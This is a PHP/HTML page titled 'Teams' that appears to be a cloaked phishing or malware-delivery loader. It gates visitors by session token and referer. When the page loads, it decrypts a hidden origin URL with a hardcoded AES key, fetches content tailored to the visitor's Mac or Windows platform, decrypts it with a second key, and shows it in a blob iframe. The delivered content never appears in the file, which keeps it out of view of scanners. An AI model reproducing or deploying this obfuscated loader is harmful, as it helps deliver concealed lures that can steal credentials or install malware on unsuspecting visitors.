<?php
session_start();

// Security: Check token from index.php
$token = isset($_GET['token']) ? $_GET['token'] : '';

// Also check referer as additional security
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$host = $_SERVER['HTTP_HOST'];

// Verify token and referer
if (!isset($_SESSION['iframe_token']) || 
    $_SESSION['iframe_token'] !== $token || 
    empty($referer) || 
    strpos($referer, $host) === false) {
    // Unauthorized access - redirect to index.php
    header('Location: /index.php');
    exit;
}

// Optional: Expire token after 5 minutes
if (isset($_SESSION['token_time']) && (time() - $_SESSION['token_time'] > 300)) {
    session_destroy();
    header('Location: /index.php');
    exit;
}

// Update token time
$_SESSION['token_time'] = time();

// Original ajax-jck.html content starts here
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Teams</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
    <style>
        html, body { 
            margin: 0; 
            height: 100%; 
            overflow: hidden; 
            background: #fff; 
        }
        #frame { 
            width: 100%; 
            height: 100vh; 
            border: 0; 
            display: block; 
        }
        #loading {
            position: fixed;
            inset: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fff;
            z-index: 10000;
            flex-direction: column;
            font-family: Arial, sans-serif;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #loading p {
            margin-top: 20px;
            color: #666;
        }
        #error-msg {
            display: none;
            text-align: center;
            padding: 20px;
            font-family: Arial, sans-serif;
        }
        #error-msg .error-icon {
            font-size: 48px;
            color: #e74c3c;
        }
        #error-msg h3 {
            color: #333;
            margin: 10px 0;
        }
        #error-msg button {
            padding: 10px 30px;
            margin-top: 20px;
            cursor: pointer;
            background: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
        }
        #error-msg button:hover {
            background: #2980b9;
        }
    </style>

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-0LY0HY7L01');
    </script>
</head>
<body>

    <!-- Loading indicator -->
    <div id="loading">
        <div class="spinner"></div>
        <p>Loading encrypted content...</p>
    </div>

    <!-- Error message -->
    <div id="error-msg">
        <div class="error-icon">⚠️</div>
        <h3>Failed to Load Content</h3>
        <p id="error-detail">Please check your connection and try again.</p>
        <button onclick="location.reload()">Refresh Page</button>
    </div>

    <!-- Main iframe that will load blob content -->
    <iframe id="frame" 
            title="encrypted shop" 
            allowfullscreen 
            allow="fullscreen"
            style="width: 100%; height: 100vh; border: 0; display: none;">
    </iframe>

    <script>
        const PASSPHRASE = "98yNCjeAfWMwk0wI";  
        const URL_KEY = "UrLk3yShopEase01";
        const ENC_DATA_ORIGIN = "U2FsdGVkX19JzfJcbkpx0lIuONyvMQ9gjcZSw7Bx/Bs36JWstdXSf0v9oWVxZd0x8lBsfAIDzu549PjWPlHakQ==";
        const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
        const DATA_URL = DATA_ORIGIN + "/data";
        let lastUrl = null;

        function detectPlatform() {
            try {
                const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
                          navigator.platform || navigator.userAgent || "";
                return /mac/i.test(p) ? "mac" : "win";
            } catch(e) {
                return "win";
            }
        }

        function showError(message) {
            document.getElementById("loading").style.display = "none";
            const errorDiv = document.getElementById("error-msg");
            errorDiv.style.display = "block";
            document.getElementById("error-detail").textContent = message || "Unknown error occurred";
        }

        async function loadSecret() {
            const frame = document.getElementById("frame");
            const loading = document.getElementById("loading");
            
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 30000);
                
                const res = await fetch(DATA_URL + "?platform=" + detectPlatform(), {
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                
                if (!res.ok) {
                    throw new Error(`HTTP ${res.status}: ${res.statusText}`);
                }
                
                const data = await res.json();
                
                if (!data || !data.cipher) {
                    throw new Error("No cipher data received");
                }
                
                const html = CryptoJS.AES.decrypt(data.cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
                
                if (!html || html.trim() === "") {
                    throw new Error("Decryption failed or empty content");
                }

                if (lastUrl) {
                    URL.revokeObjectURL(lastUrl);
                    lastUrl = null;
                }
                
                const blob = new Blob([html], { type: "text/html; charset=utf-8" });
                lastUrl = URL.createObjectURL(blob);

                frame.style.display = "block";
                loading.style.display = "none";
                frame.src = lastUrl;
                
                frame.onload = function() {
                    console.log("✅ Content loaded successfully in iframe");
                };
                
                frame.onerror = function(e) {
                    console.error("❌ Iframe load error:", e);
                    showError("Failed to load content in iframe");
                };

            } catch (e) {
                console.error("❌ Failed to load content:", e);
                if (e.name === 'AbortError') {
                    showError("Request timed out. Please try again.");
                } else {
                    showError(e.message || "Unknown error occurred");
                }
            }
        }

        window.addEventListener("DOMContentLoaded", function() {
            setTimeout(loadSecret, 100);
        });

        console.log("✅ ajax-jck.php loaded successfully");
    </script>
</body>
</html>
